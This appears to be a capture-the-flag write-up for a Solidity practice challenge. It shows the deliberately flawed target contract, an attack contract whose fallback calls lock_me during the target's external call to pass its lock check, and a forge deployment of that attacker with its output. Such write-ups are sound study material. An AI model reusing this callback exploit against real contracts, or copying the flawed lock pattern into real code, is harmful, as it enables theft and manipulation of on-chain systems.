# Contract Address

0x771F8f8FD270eD99db6a3B5B7e1d9f6417394249

# Contract

```sol
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.13;

//1) The goal of this challenge is to be able to add your address to the array of winners.
//2) Make the getAllwiners function incude your name in the array of winners.

contract Challenge {
    address owner;
    address[] public winners;
    mapping(address => bool) public HasInteracted;
    mapping(address => string) public Names;
    bool lock;
    bool isPause;

    constructor() {
        owner = msg.sender;
    }

    function exploit_me(string memory _name) public {
        require(!isPause);
        lock = false;

        msg.sender.call("");

        require(lock);
        require(
            HasInteracted[msg.sender] == false,
            "This address has interacted before"
        );

        HasInteracted[msg.sender] = true;
        winners.push(tx.origin);
        string memory name_ = Names[tx.origin];
        require(
            keccak256(abi.encode(name_)) == keccak256(abi.encode("")),
            "Not a unique winner"
        );
        Names[tx.origin] = _name;
    }

    function lock_me() public {
        lock = true;
    }

    function pause(bool _status) external {
        require(msg.sender == owner);
        isPause = _status;
    }

    function getAllwiners() external view returns (string[] memory _names) {
        _names = new string[](winners.length);
        for (uint i; i < winners.length; i++) {
            _names[i] = Names[winners[i]];
        }
    }
}
```

# Attack Contract

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "../src/winner.sol";

contract attackWinner {
    bool public toggle;
    Challenge public attack;

    constructor(address _targetaddr) {
        attack = Challenge(_targetaddr);
    }

    function bankai(string memory _name) external {
        attack.exploit_me(_name);
    }

    fallback() external payable {
        if (!toggle) {
            toggle = true;
            attack.lock_me();
        }
    }


}
```
Lets deploy this using forge

```
┌──(bl4ck4non💀bl4ck4non-sec)-[~/Documents/web3/foundry/learninggg_foundryyyy]
└─$ forge create --private-key $PRIVATE_KEY src/attackWinner.sol:attackWinner --constructor-args "0x771F8f8FD270eD99db6a3B5B7e1d9f6417394249" 
[⠊] Compiling...
No files changed, compilation skipped
Deployer: 0x296f076DB25846579300E2F89aCBC20bcd96fd3c
Deployed to: 0x1BfEF0b68F985a26aDB235afA2Ab86514f6DeDC8
Transaction hash: 0x650f0540f8ab4636da94695032be758ae909ca136cad42ec4d55b0472cc9ebac
```

![image](https://github.com/user-attachments/assets/0077e574-ab0a-423e-aa56-60cbe4ae24b4)

























